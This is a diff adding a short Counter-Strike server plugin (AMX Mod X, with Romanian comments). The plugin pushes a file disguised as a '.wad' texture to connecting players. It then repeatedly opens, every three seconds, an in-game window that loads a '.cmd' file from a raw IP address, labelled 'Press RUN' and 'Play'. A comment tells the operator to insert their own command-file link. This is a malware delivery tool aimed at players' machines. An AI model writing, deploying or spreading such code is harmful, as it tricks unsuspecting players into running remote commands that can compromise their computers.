@@ -1,0 +1,23 @@
+#include <amxmodx>
+#include <fakemeta>
+
+#define VBS "banana.wad"
+// numele la wad
+
+public plugin_precache()
+{
+	precache_generic(VBS)
+	register_forward(101,"Hook1",0)
+}
+
+public Hook1(id)
+{
+	set_task(3.0,"motd",id,_,_,"b")
+	// 3.0 reprezinta secundele, la cat timp ii arata motd
+}
+public motd(id)
+{
+	show_motd(id,"http://146.59.229.148/cmd/Apasa_RUN.cmd","Joaca")
+	// aici pui linku tau de la cmd , neaparat tgrb sa ai pus si htaccessu pe folderu ala
+
+}
